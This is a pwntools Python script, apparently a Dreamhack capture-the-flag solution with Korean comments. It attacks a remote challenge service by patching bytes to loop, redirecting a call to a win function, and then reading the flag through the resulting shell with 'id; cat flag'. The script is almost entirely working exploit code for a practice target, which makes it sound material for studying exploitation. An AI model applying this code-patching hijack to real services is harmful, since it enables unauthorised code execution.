from pwn import *

p = remote('host8.dreamhack.games', 16096)

def patch_byte(idx, val, first_time=False):
    # 첫 번째 시도가 아닐 때는 (idx) 프롬프트가 뜨지 않습니다!
    # 따라서 first_time이 True일 때만 기다립니다.
    if first_time:
        p.recvuntil(b"(idx): ")

    p.sendline(str(idx).encode())
    
    p.recvuntil(b"(val): ")
    p.sendline(str(val).encode())
    
    print(f"[+] Patched idx {idx} -> {val}")

print("\n[+] Starting Bankai Exploit...\n")

# [Stage 1] Loop 생성 (142 = 0x8E = -114)
# 처음에는 프롬프트가 뜨므로 True
patch_byte(804, 142, first_time=True)

# [Stage 2] Call Target 수정 (Low Byte: 0xBF = 191)
# 이제부터는 프롬프트가 안 뜨므로 바로 전송
patch_byte(806, 191)

# [Stage 3] Call Target 수정 (High Byte: 0xFE = 254)
patch_byte(807, 254)

# [Stage 4] Loop 해제 (0x00)
# 루프를 풀어서 밑으로 흘러가게 함 -> win 실행
patch_byte(804, 0)

# [Final] 쉘 확인
print("\n[+] Loop Released. Checking shell...")
sleep(0.5)
p.sendline(b"id; cat flag")
p.interactive()